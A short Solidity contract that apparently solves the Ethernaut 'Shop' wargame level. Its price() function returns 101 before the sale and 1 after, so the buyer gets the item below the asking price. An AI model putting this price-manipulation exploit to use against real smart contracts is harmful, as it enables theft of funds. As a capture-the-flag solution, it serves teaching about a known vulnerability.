pragma solidity ^0.5;

import '../levels/Shop.sol';

contract HackShop is Buyer {
  function price () external view returns (uint) {
    return Shop(msg.sender).isSold() ? 1: 101;
  }

  function hack (address _shop) external {
      Shop(_shop).buy();
  }
}
